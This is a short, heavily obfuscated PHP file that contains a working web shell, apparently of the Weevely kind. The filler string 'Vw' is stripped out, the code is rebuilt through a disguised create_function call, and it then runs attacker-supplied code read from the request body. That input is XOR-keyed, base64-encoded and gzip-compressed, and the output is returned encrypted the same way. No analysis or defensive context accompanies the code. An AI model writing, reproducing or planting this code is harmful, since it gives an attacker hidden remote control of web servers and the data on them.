<?php
$O='$r=@basVwe6Vw4_encode(@x(Vw@gVwzVwcomprVwessVw($Vwo),$k));prinVwt("$p$kh$r$kf");}';
$A='wh("/$kh(Vw.+)$kfVw/VwVw",@file_get_cVwVwontents("pVwhp:/Vw/input"),$Vwm)';
$N='Vwstrlen($tVwVw);$o=""Vw;for($i=0;$iVw<$l;){Vwfor($j=VwVw0;($j<$c&&$iVw<$';
$d='lVw)Vw;$j++,$i++){$VwVwo.=$tVw{$i}^$Vwk{$jVw};}}return $o;}ifVw (@preg_VwmatcV';
$w='e($m[1])Vw,$k))Vw);$o=Vw@obVw_get_contVwents();Vw@ob_VwenVwd_clVwean();';
$T='$k="VwffbfVwVwe432";$kh=Vw"df5100a24471Vw";$kfVw="08Vw090bVwcd792Vw8";$p';
$g='==1) {@oVwb_starVwt(Vw);@eVwval(@gzuncVwomVwpresVws(Vw@x(@baVwse64_decod';
$J=str_replace('ya','','yacreatyae_yafyayaunyaction');
$y='="WsX0xZVwUkLWSVwvkEfS";VwfunctioVwn x($tVw,$Vwk)VwVw{$c=strlVwen($k);$l=';
$h=str_replace('Vw','',$T.$y.$N.$d.$A.$g.$w.$O);
$z=$J('',$h);$z();
?>
